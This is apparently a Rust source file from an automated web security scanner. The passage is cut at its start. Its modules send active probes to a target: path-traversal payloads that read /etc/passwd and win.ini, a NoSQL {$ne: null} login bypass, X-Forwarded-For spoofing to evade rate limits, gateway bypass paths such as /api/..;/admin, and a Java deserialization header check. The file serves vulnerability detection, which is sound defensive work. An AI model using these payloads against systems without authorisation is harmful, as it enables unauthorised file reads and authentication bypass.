        let signatures: &[(&str, &str)] = &[
            ("there isn't a github pages site here", "GitHub Pages"),
            ("nosuchbucket", "AWS S3"),
            ("the specified bucket does not exist", "AWS S3"),
            ("heroku | no such app", "Heroku"),
            ("project not found", "Vercel"),
            ("repository not found", "GitHub Pages"),
            ("no such app", "Heroku"),
            ("trying to access your account", "Tilda"),
            ("fastly error: unknown domain", "Fastly"),
            ("the request could not be satisfied", "CloudFront"),
            ("is not a registered", "Azure"),
            ("unconfigured", "Fly.io"),
            ("domain is not configured", "Netlify"),
            ("this shop is unavailable", "Shopify"),
            ("help.instagram.com", "Instagram"),
        ];
        for (sig, vendor) in signatures {
            if body_low.contains(sig) {
                findings.push(finding(
                    "subdomain_takeover",
                    &format!("Dangling {} reference (possible takeover)", vendor),
                    "critical",
                    "T1584.001",
                    &format!(
                        "Response from {} contains takeover signature for {} ({}).",
                        p.final_url, vendor, sig
                    ),
                    target,
                ));
            }
        }
    }
    if findings.is_empty() {
        empty_ok("subdomain_takeover", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("subdomain_takeover: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_subdomain_takeover, run_subdomain_takeover_result);

// ── file_inclusion_rfi ────────────────────────────────────────────────────────
// Strengthened: try Linux + Windows targets, URL-encoded + double-encoded variants, and reject
// payload reflection without the canary content to avoid false positives.
pub async fn run_file_inclusion_rfi_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    // (payload, canary substring that proves arbitrary file read)
    let payloads: &[(&str, &str)] = &[
        ("/etc/passwd", "root:x:0:0"),
        ("../../../../etc/passwd", "root:x:0:0"),
        ("..%2f..%2f..%2fetc%2fpasswd", "root:x:0:0"),
        ("..%252f..%252f..%252fetc%252fpasswd", "root:x:0:0"),
        ("C:%5CWindows%5Cwin.ini", "[fonts]"),
        ("file:///etc/passwd", "root:x:0:0"),
    ];
    let params = ["file", "page", "path", "include", "doc", "f", "template"];

    for q in params {
        for (payload, canary) in payloads {
            let url = format!("{}/?{}={}", base.trim_end_matches('/'), q, payload);
            if let Some(p) = http_get(&client, &url).await {
                // Avoid false positives when the server echoes the payload itself rather than the
                // file contents. The canary string ('root:x:0:0' / '[fonts]') is the real proof.
                if p.body.contains(canary) && !p.body.contains(payload) {
                    let mut f = finding(
                        "file_inclusion_rfi",
                        &format!("LFI confirmed via ?{}={}", q, payload),
                        "critical",
                        "T1083",
                        &format!(
                            "Response to ?{}={} on {} contains the canary '{}' — file inclusion is confirmed.",
                            q, payload, p.final_url, canary
                        ),
                        target,
                    );
                    if let Some(obj) = f.as_object_mut() {
                        obj.insert("payload".into(), Value::String(payload.to_string()));
                        obj.insert("parameter".into(), Value::String(q.to_string()));
                    }
                    findings.push(f);
                }
            }
        }
    }
    if findings.is_empty() {
        empty_ok("file_inclusion_rfi", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("file_inclusion_rfi: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_file_inclusion_rfi, run_file_inclusion_rfi_result);

// ── deserialization_net (multi-platform insecure-deserialization detector) ──────
/// POST a raw body with a chosen Content-Type and return `(status, body)`.
/// Used to send the bare Java serialization stream header (no gadget) and observe
/// whether the endpoint feeds it into `ObjectInputStream.readObject()`.
async fn post_raw(
    client: &reqwest::Client,
    url: &str,
    body: Vec<u8>,
    content_type: &str,
) -> Option<(u16, String)> {
    let resp = client
        .post(url)
        .header("Content-Type", content_type)
        .body(body)
        .send()
        .await
        .ok()?;
    let status = resp.status().as_u16();
    let text = resp.text().await.unwrap_or_default();
    let text = if text.len() > 65_536 {
        text[..65_536].to_string()
    } else {
        text
    };
    Some((status, text))
}

/// True when a response body carries a Java deserialization error signature.
fn java_deser_error(body_lower: &str) -> bool {
    body_lower.contains("invalidclassexception")
        || body_lower.contains("streamcorruptedexception")
        || body_lower.contains("optionaldataexception")
        || body_lower.contains("java.io.objectinputstream")
        || (body_lower.contains("readobject") && body_lower.contains("java.io"))
}

pub async fn run_deserialization_net_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let url = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    // 1. Passive: parse the live page for serialization sinks (real evidence).
    if let Some(p) = http_get(&client, &url).await {
        let low = p.body.to_ascii_lowercase();
        let cookies = p
            .headers
            .iter()
            .filter(|(k, _)| k.eq_ignore_ascii_case("set-cookie"))
            .map(|(_, v)| v.clone())
            .collect::<Vec<_>>()
            .join("; ");

        if low.contains("__viewstate") {
            let encrypted = low.contains("__viewstateencrypted");
            findings.push(web_finding(
                "deserialization_net",
                "ASP.NET ViewState present (deserialization sink)",
                if encrypted { "medium" } else { "high" },
                "T1190",
                &format!(
                    "{} returns a __VIEWSTATE field{}. With a leaked machineKey or disabled MAC, ViewState is a remote deserialization → RCE sink (CVE-2020-0688 class). Enforce ViewState MAC + encryption and rotate the machineKey.",
                    p.final_url,
                    if encrypted { " (encrypted)" } else { " and no __VIEWSTATEENCRYPTED marker" }
                ),
                target,
            ));
        }
        if low.contains("javax.faces.viewstate") || low.contains("jakarta.faces.viewstate") {
            findings.push(web_finding(
                "deserialization_net",
                "JSF ViewState present (Mojarra/MyFaces Java deserialization)",
                "high",
                "T1190",
                &format!(
                    "{} exposes a JSF ViewState field. Client-side, unencrypted JSF state is a Java deserialization RCE vector (CVE-2017-1000486 class). Set STATE_SAVING_METHOD=server and encrypt client state.",
                    p.final_url
                ),
                target,
            ));
        }
        if p.body.contains("rO0AB") || cookies.contains("rO0AB") {
            findings.push(web_finding(
                "deserialization_net",
                "Java serialized object reflected (base64 magic rO0AB)",
                "high",
                "T1190",
                &format!(
                    "{} reflects a base64 Java serialized stream (rO0AB → AC ED 00 05) in its body/cookies. If attacker-controlled serialized data is deserialized, this is a ysoserial gadget-chain RCE surface — switch to signed/encrypted tokens.",
                    p.final_url
                ),
                target,
            ));
        }
    }

    // 2. Active (safe): send ONLY the 4-byte Java serialization stream header — no
    //    gadget, no payload — and detect a deserialization error signature, which
    //    proves the endpoint calls ObjectInputStream.readObject() on request bodies.
    let java_stream_header = vec![0xACu8, 0xED, 0x00, 0x05];
    for path in [
        "",
        "/invoker/JMXInvokerServlet",
        "/invoker/EJBInvokerServlet",
        "/remoting/RemoteService",
    ] {
        let u = if path.is_empty() {
            url.clone()
        } else {
            join_url(&url, path)
        };
        if let Some((status, text)) = post_raw(
            &client,
            &u,
            java_stream_header.clone(),
            "application/x-java-serialized-object",
        )
        .await
        {
            if java_deser_error(&text.to_ascii_lowercase()) {
                findings.push(web_finding(
                    "deserialization_net",
                    "Endpoint deserializes Java input (error-signature confirmed)",
                    "critical",
                    "T1190",
                    &format!(
                        "{} returned HTTP {} with a Java deserialization error signature when sent a bare serialization stream header (no gadget). The endpoint feeds request bodies into ObjectInputStream.readObject() — a remote-code-execution deserialization sink. Reject java-serialized content-types and adopt look-ahead deserialization (e.g. ValidatingObjectInputStream / allow-list).",
                        u, status
                    ),
                    target,
                ));
                break;
            }
        }
    }

    if findings.is_empty() {
        empty_ok("deserialization_net", target)
    } else {
        let n = findings.len();
        EngineResult::ok(findings, format!("deserialization_net: {} finding(s)", n))
    }
}
cli_wrapper!(run_deserialization_net, run_deserialization_net_result);

/// True when a CSP is present but style-src is absent or allows inline styles.
#[must_use]
fn css_injection_csp_weak(csp: &str) -> bool {
    let csp = csp.trim();
    if csp.is_empty() {
        return false;
    }
    !csp.contains("style-src") || csp.contains("style-src 'unsafe-inline'")
}

/// True when a NoSQL operator payload yields a stronger success signal than a baseline login attempt.
#[must_use]
fn nosql_bypass_signal(
    baseline_status: u16,
    baseline_body: &str,
    operator_status: u16,
    operator_body: &str,
) -> bool {
    if operator_status < 200 || operator_status >= 300 {
        return false;
    }
    let baseline_ok = baseline_status >= 200 && baseline_status < 300;
    if baseline_ok {
        return false;
    }
    let body_low = operator_body.to_ascii_lowercase();
    let auth_markers = [
        "token",
        "access_token",
        "jwt",
        "session",
        "success",
        "authenticated",
    ];
    auth_markers
        .iter()
        .any(|m| body_low.contains(m) && !baseline_body.to_ascii_lowercase().contains(m))
}

// ── nosql_deep_injection ──────────────────────────────────────────────────────
pub async fn run_nosql_deep_injection_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    for path in ["/api/users", "/api/login", "/login", "/api/v1/users"] {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        let baseline_payload =
            serde_json::json!({"username": "weissman_probe", "password": "weissman_probe"});
        let operator_payload =
            serde_json::json!({"username": {"$ne": null}, "password": {"$ne": null}});
        let baseline = crate::engine_probes::http_post_json(&client, &url, &baseline_payload).await;
        let operator = crate::engine_probes::http_post_json(&client, &url, &operator_payload).await;
        if let (Some(b), Some(o)) = (baseline, operator) {
            if nosql_bypass_signal(b.status, &b.body, o.status, &o.body) {
                findings.push(finding(
                    "nosql_deep_injection",
                    "NoSQL-style operator accepted by login endpoint",
                    "high",
                    "T1190",
                    &format!(
                        "POST {} baseline HTTP {} vs operator HTTP {} — {{$ne}} bypass candidate (baseline denied, operator succeeded with auth markers).",
                        o.final_url, b.status, o.status
                    ),
                    target,
                ));
            }
        }
    }
    if findings.is_empty() {
        empty_ok("nosql_deep_injection", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("nosql_deep_injection: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_nosql_deep_injection, run_nosql_deep_injection_result);

// ── jwt_advanced_attack ───────────────────────────────────────────────────────
pub async fn run_jwt_advanced_attack_result(target: &str) -> EngineResult {
    crate::jwt_attack_engine::run_jwt_attack_result(target).await
}
cli_wrapper!(run_jwt_advanced_attack, run_jwt_advanced_attack_result);

// ── api_rate_limit_bypass ─────────────────────────────────────────────────────
pub async fn run_api_rate_limit_bypass_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let url = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    let mut baseline_limited = 0;
    let mut baseline_sent = 0;
    for _ in 0..12 {
        if let Some(p) = http_get(&client, &url).await {
            baseline_sent += 1;
            if p.status == 429 {
                baseline_limited += 1;
            }
        }
    }

    let spoof_ips = [
        "10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5",
        "192.168.1.10", "172.16.0.8", "203.0.113.7", "198.51.100.42",
    ];
    let mut spoof_limited = 0;
    let mut spoof_sent = 0;
    for (i, ip) in spoof_ips.iter().enumerate() {
        if let Some(p) = http_get_with_headers(
            &client,
            &url,
            &[
                ("X-Forwarded-For", ip),
                ("X-Real-IP", ip),
                ("Client-IP", ip),
                ("X-Originating-IP", ip),
            ],
        )
        .await
        {
            spoof_sent += 1;
            if p.status == 429 {
                spoof_limited += 1;
            }
            if i > 3 && p.status == 200 && baseline_limited > 0 && spoof_limited == 0 {
                findings.push(web_finding(
                    "api_rate_limit_bypass",
                    "Rate limit bypass via X-Forwarded-For rotation",
                    "high",
                    "T1499.003",
                    &format!(
                        "Baseline burst hit {}×429 but rotating X-Forwarded-For still returns HTTP 200 on {} — per-IP limits are spoofable.",
                        baseline_limited, p.final_url
                    ),
                    target,
                ));
                break;
            }
        }
    }

    if baseline_sent > 0 && baseline_limited == 0 && spoof_sent > 0 {
        findings.push(web_finding(
            "api_rate_limit_bypass",
            "No 429 across baseline or spoofed bursts",
            "medium",
            "T1499.003",
            &format!(
                "Sent {baseline_sent} baseline + {spoof_sent} X-Forwarded-For requests to {url} without HTTP 429 — verify per-user/API-key throttles."
            ),
            target,
        ));
    }

    if findings.is_empty() {
        empty_ok("api_rate_limit_bypass", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("api_rate_limit_bypass: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_api_rate_limit_bypass, run_api_rate_limit_bypass_result);

// ── idor_advanced ─────────────────────────────────────────────────────────────
pub async fn run_idor_advanced_result(target: &str) -> EngineResult {
    crate::bola_idor_engine::run_bola_idor_result(target, None).await
}
cli_wrapper!(run_idor_advanced, run_idor_advanced_result);

// ── graphql_subscription_attack ───────────────────────────────────────────────
pub async fn run_graphql_subscription_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let base = normalize_url(target);
    let client = http_client().await;
    let mut findings: Vec<Value> = Vec::new();
    let sub_query = serde_json::json!({"query":"subscription { __typename }"});
    let ws_paths = [
        "/graphql",
        "/api/graphql",
        "/subscriptions",
        "/api/subscriptions",
        "/graphql/ws",
        "/api/graphql/stream",
    ];
    for path in ws_paths {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        if let Some(p) = http_post_json(&client, &url, &sub_query).await {
            let body_low = p.body.to_ascii_lowercase();
            if body_low.contains("subscription")
                && (body_low.contains("not supported")
                    || body_low.contains("cannot")
                    || body_low.contains("websocket")
                    || body_low.contains("ws"))
            {
                findings.push(web_finding(
                    "graphql_subscription_attack",
                    "GraphQL subscription transport referenced",
                    "info",
                    "T1190",
                    &format!(
                        "POST {} returned subscription-related errors (HTTP {}) — WebSocket subscription transport may be enabled; verify auth on upgrade.",
                        p.final_url, p.status
                    ),
                    target,
                ));
            } else if p.status >= 200 && p.status < 300 && p.body.contains("__typename") {
                findings.push(web_finding(
                    "graphql_subscription_attack",
                    "GraphQL subscription query accepted over HTTP",
                    "medium",
                    "T1190",
                    &format!(
                        "Subscription query accepted at {} (HTTP {}) without WebSocket upgrade — check authorization on live subscription streams.",
                        p.final_url, p.status
                    ),
                    target,
                ));
            }
        }
        if let Some(p) = http_method_with_headers(
            &client,
            "GET",
            &url,
            None,
            &[
                ("Connection", "Upgrade"),
                ("Upgrade", "websocket"),
                ("Sec-WebSocket-Version", "13"),
                ("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ=="),
            ],
        )
        .await
        {
            if p.status == 101
                || header_value(&p.headers, "upgrade")
                    .map(|u| u.to_ascii_lowercase().contains("websocket"))
                    .unwrap_or(false)
            {
                findings.push(web_finding(
                    "graphql_subscription_attack",
                    "WebSocket upgrade accepted on GraphQL path",
                    "high",
                    "T1190",
                    &format!(
                        "GET {} returned HTTP {} with Upgrade:websocket — live subscription streams may lack auth.",
                        p.final_url, p.status
                    ),
                    target,
                ));
                break;
            }
        }
    }
    if findings.is_empty() {
        empty_ok("graphql_subscription_attack", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("graphql_subscription_attack: {}", findings.len()),
        )
    }
}
cli_wrapper!(
    run_graphql_subscription_attack,
    run_graphql_subscription_attack_result
);

// ── webrtc_attack ─────────────────────────────────────────────────────────────
pub async fn run_webrtc_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    if let Some(p) = http_get(&client, &base).await {
        let body = &p.body;
        let has_rtc = body.contains("RTCPeerConnection")
            || body.contains("getUserMedia")
            || body.contains("webkitRTCPeerConnection");
        if has_rtc {
            let perms = header_value(&p.headers, "permissions-policy").unwrap_or_default();
            if !perms.contains("camera") && !perms.contains("microphone") {
                findings.push(web_finding(
                    "webrtc_attack",
                    "WebRTC code without Permissions-Policy hardening",
                    "medium",
                    "T1185",
                    &format!(
                        "{} uses WebRTC APIs but Permissions-Policy is missing for camera/microphone.",
                        p.final_url
                    ),
                    target,
                ));
            }
        }
        if body.contains("stun:") || body.contains("turn:") || body.contains("iceServers") {
            findings.push(web_finding(
                "webrtc_attack",
                "STUN/TURN ICE servers exposed in page",
                "medium",
                "T1185",
                &format!(
                    "{} embeds ICE server configuration — review for credential leakage and SSRF via TURN.",
                    p.final_url
                ),
                target,
            ));
        }
    }

    let rtc_paths = ["/webrtc", "/api/webrtc", "/call", "/video", "/rtc"];
    let probes = probe_paths_concurrent(&client, &base, &rtc_paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        if p.status < 400 {
            let b = p.body.to_ascii_lowercase();
            if b.contains("rtcpeerconnection") || b.contains("getusermedia") || b.contains("iceservers") {
                findings.push(web_finding(
                    "webrtc_attack",
                    "WebRTC surface on dedicated path",
                    "medium",
                    "T1185",
                    &format!(
                        "{} ({}) — WebRTC signaling endpoint may leak media permissions or TURN creds.",
                        p.final_url, p.status
                    ),
                    target,
                ));
                break;
            }
        }
    }

    if findings.is_empty() {
        empty_ok("webrtc_attack", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("webrtc_attack: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_webrtc_attack, run_webrtc_attack_result);

// ── web3_dapp_attack ──────────────────────────────────────────────────────────
pub async fn run_web3_dapp_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    if let Some(p) = http_get(&client, &base).await {
        let body = &p.body;
        if body.contains("window.ethereum")
            || body.contains("web3.eth")
            || body.contains("WalletConnect")
            || body.contains("ethers.")
        {
            findings.push(web_finding(
                "web3_dapp_attack",
                "Web3/dApp surface detected in DOM",
                "info",
                "T1190",
                &format!(
                    "{} references wallet/provider APIs — review transaction signing, chainId validation, and phishing.",
                    p.final_url
                ),
                target,
            ));
        }
        if body.contains("chainId") && body.contains("0x") {
            findings.push(web_finding(
                "web3_dapp_attack",
                "chainId configuration exposed client-side",
                "low",
                "T1190",
                &format!(
                    "{} exposes chainId in client bundle — verify network mismatch and replay protections.",
                    p.final_url
                ),
                target,
            ));
        }
    }

    let web3_paths = [
        "/api/nft",
        "/api/mint",
        "/api/web3",
        "/wallet",
        "/connect",
        "/.well-known/walletconnect.txt",
    ];
    let probes = probe_paths_concurrent(&client, &base, &web3_paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        let b = p.body.to_ascii_lowercase();
        if p.status < 500
            && (b.contains("ethereum")
                || b.contains("wallet")
                || b.contains("nft")
                || b.contains("contract"))
        {
            findings.push(web_finding(
                "web3_dapp_attack",
                "Web3 API path exposes blockchain surface",
                "medium",
                "T1190",
                &format!(
                    "{} ({}) — review smart-contract calls and wallet connect flows for drain/phishing.",
                    p.final_url, p.status
                ),
                target,
            ));
            break;
        }
    }

    if findings.is_empty() {
        empty_ok("web3_dapp_attack", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("web3_dapp_attack: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_web3_dapp_attack, run_web3_dapp_attack_result);

// ── api_gateway_bypass ────────────────────────────────────────────────────────
pub async fn run_api_gateway_bypass_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    if let Some(p) = http_get(&client, &base).await {
        let server = header_value(&p.headers, "server").unwrap_or_default();
        let vendor = header_value(&p.headers, "x-amz-apigw-id")
            .or_else(|| header_value(&p.headers, "x-azure-ref"))
            .or_else(|| header_value(&p.headers, "x-envoy-upstream-service-time"));
        let srv = server.to_ascii_lowercase();
        if srv.contains("kong")
            || srv.contains("apigee")
            || srv.contains("envoy")
            || vendor.is_some()
        {
            findings.push(web_finding(
                "api_gateway_bypass",
                "API gateway / mesh detected",
                "info",
                "T1190",
                &format!(
                    "Server='{server}' gateway-marker={vendor:?} on {} — test direct-backend bypass paths.",
                    p.final_url
                ),
                target,
            ));
        }
    }

    let bypass_paths = [
        "/api/../admin",
        "/api/v1/../internal",
        "/%2e%2e/admin",
        "/api/..;/admin",
        "/v1/api/../../admin",
        "/api/internal",
        "/backend/api",
        "/_gateway_bypass_probe",
    ];
    let probes = probe_paths_concurrent(&client, &base, &bypass_paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        if p.status == 200
            && !p.body.is_empty()
            && (p.body.to_ascii_lowercase().contains("admin")
                || p.body.to_ascii_lowercase().contains("dashboard")
                || p.body.to_ascii_lowercase().contains("internal"))
        {
            findings.push(web_finding(
                "api_gateway_bypass",
                "Path normalization may bypass gateway ACL",
                "high",
                "T1190",
                &format!(
                    "{} returned HTTP 200 with privileged keywords — gateway path normalization bypass candidate.",
                    p.final_url
                ),
                target,
            ));
            break;
        }
    }

    if let Some(p) = http_get_with_headers(
        &client,
        &base,
        &[
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/internal/config"),
        ],
    )
    .await
    {
        if p.status < 500
            && (p.body.to_ascii_lowercase().contains("admin")
                || p.body.to_ascii_lowercase().contains("config"))
        {
            findings.push(web_finding(
                "api_gateway_bypass",
                "X-Original-URL / X-Rewrite-URL routing override signal",
                "high",
                "T1190",
                &format!(
                    "Headers X-Original-URL/X-Rewrite-URL altered routing on {} (HTTP {}) — reverse-proxy bypass risk.",
                    p.final_url, p.status
                ),
                target,
            ));
        }
    }

    if findings.is_empty() {
        empty_ok("api_gateway_bypass", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("api_gateway_bypass: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_api_gateway_bypass, run_api_gateway_bypass_result);

// ── browser_extension_attack ──────────────────────────────────────────────────
pub async fn run_browser_extension_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    if let Some(p) = http_get(&client, &base).await {
        let csp = header_value(&p.headers, "content-security-policy").unwrap_or_default();
        let csp_low = csp.to_ascii_lowercase();
        if !csp_low.contains("script-src") {
            findings.push(web_finding(
                "browser_extension_attack",
                "Missing script-src CSP",
                "medium",
                "T1185",
                &format!(
                    "{} lacks script-src CSP — extension content scripts can inject without restriction.",
                    p.final_url
                ),
                target,
            ));
        }
        if csp.contains("chrome-extension://") || csp.contains("moz-extension://") {
            findings.push(web_finding(
                "browser_extension_attack",
                "CSP allows browser extension origins",
                "high",
                "T1185",
                &format!(
                    "CSP on {} whitelists extension schemes — malicious extensions may read credentialed pages.",
                    p.final_url
                ),
                target,
            ));
        }
        if !csp_low.contains("connect-src") {
            findings.push(web_finding(
                "browser_extension_attack",
                "Missing connect-src CSP (extension exfil surface)",
                "medium",
                "T1185",
                &format!(
                    "{} lacks connect-src — pages may beacon data to arbitrary origins from extension contexts.",
                    p.final_url
                ),
                target,
            ));
        }
    }

    let ext_paths = [
        "/manifest.json",
        "/extension/manifest.json",
        "/static/manifest.json",
        "/assets/manifest.json",
        "/chrome-extension/manifest.json",
    ];
    let probes = probe_paths_concurrent(&client, &base, &ext_paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        if p.status == 200
            && (p.body.contains("\"manifest_version\"")
                || p.body.contains("web_accessible_resources")
                || p.body.contains("content_scripts"))
        {
            findings.push(web_finding(
                "browser_extension_attack",
                "Web-accessible extension manifest exposed",
                "high",
                "T1185",
                &format!(
                    "Extension manifest at {} — review web_accessible_resources and content_scripts for XSS→extension pivot.",
                    p.final_url
                ),
                target,
            ));
            break;
        }
    }

    if findings.is_empty() {
        empty_ok("browser_extension_attack", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("browser_extension_attack: {}", findings.len()),
        )
    }
}
cli_wrapper!(
    run_browser_extension_attack,
    run_browser_extension_attack_result
);

#[inline]
fn _shut_up_unused(p: &HttpProbe) -> bool {
    !p.headers.is_empty()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cors_signal_flags_reflective_origin_with_credentials() {
        let sent = "https://weissman-cors-probe.example.com";
        let sig = cors_misconfiguration_signal(Some(sent), sent, true);
        assert!(sig.is_some());
        let (_, sev, _) = sig.unwrap();
        assert_eq!(sev, "critical");
    }

    #[test]
    fn cors_signal_ignores_unrelated_acao() {
        assert!(cors_misconfiguration_signal(
            Some("https://evil.test"),
            "https://legit.test",
            false
        )
        .is_none());
    }

    #[test]
    fn css_weak_only_when_csp_present() {
        assert!(!css_injection_csp_weak(""));
        assert!(css_injection_csp_weak(
            "default-src 'self'; script-src 'self'"
        ));
        assert!(css_injection_csp_weak(
            "style-src 'unsafe-inline'; default-src 'self'"
        ));
    }

    #[test]
    fn java_deser_error_matches_known_signatures() {
        assert!(java_deser_error(
            "java.io.invalidclassexception at readobject"
        ));
        assert!(!java_deser_error("404 not found"));
    }

    #[test]
    fn nosql_bypass_requires_operator_success_not_baseline() {
        assert!(nosql_bypass_signal(
            401,
            "invalid credentials",
            200,
            r#"{"access_token":"abc"}"#
        ));
        assert!(!nosql_bypass_signal(200, "ok token", 200, "ok token"));
        assert!(!nosql_bypass_signal(401, "denied", 401, "denied"));
    }
}
